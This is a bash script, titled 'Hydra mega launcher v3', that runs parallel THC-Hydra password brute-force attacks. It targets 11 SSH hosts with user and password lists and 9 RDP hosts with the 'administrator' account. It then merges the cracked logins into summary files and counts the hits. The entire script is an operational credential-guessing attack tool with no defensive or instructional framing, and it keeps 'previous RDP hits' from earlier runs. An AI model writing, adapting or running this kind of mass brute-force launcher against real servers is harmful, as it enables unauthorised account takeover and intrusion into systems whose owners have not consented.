#!/bin/bash
# Hydra mega launcher v3
set -e
cd /tmp
rm -f ./hydra.restore

# Save previous RDP hits 
grep -v '^#' /tmp/hydra_rdp_precise.txt 2>/dev/null | grep -v '^$' > /tmp/hydra_rdp_big.txt
> /tmp/hydra_ssh_big.txt

echo "=== LAUNCH ALL HYDRA v3 ==="
echo "Time: $(date)"

# SSH: all 11 hosts
for ip in $(cat /tmp/ssh_hosts.txt); do
  nohup hydra -L /tmp/ssh_users.txt -P /tmp/big_combined.txt \
    -t 2 -I -W 5 -o /tmp/hydra_ssh_${ip}.txt -f $ip ssh \
    >> /tmp/hydra_ssh_${ip}.log 2>&1 &
done
echo "SSH: 11 launched"

# RDP: all 9 hosts
for ip in $(cat /tmp/rdp_hosts.txt); do
  nohup hydra -l administrator -P /tmp/big_combined.txt \
    -t 1 -I -w 5 -o /tmp/hydra_rdp_${ip}.txt -f $ip rdp \
    >> /tmp/hydra_rdp_${ip}.log 2>&1 &
done
echo "RDP: 9 launched"

# Wait for ALL
wait

# Merge results
echo "=== MERGING at $(date) ==="
for f in /tmp/hydra_ssh_*.txt; do
  grep "host:" "$f" 2>/dev/null >> /tmp/hydra_ssh_big.txt
done
for f in /tmp/hydra_rdp_*.txt; do
  hit=$(grep "host:" "$f" 2>/dev/null)
  if [ -n "$hit" ]; then
    echo "$hit" >> /tmp/hydra_rdp_big.txt
  fi
done

echo "SSH hits: $(grep -c host: /tmp/hydra_ssh_big.txt 2>/dev/null || echo 0)"
echo "RDP hits: $(grep -c host: /tmp/hydra_rdp_big.txt 2>/dev/null || echo 0)"
echo "=== COMPLETE at $(date) ==="
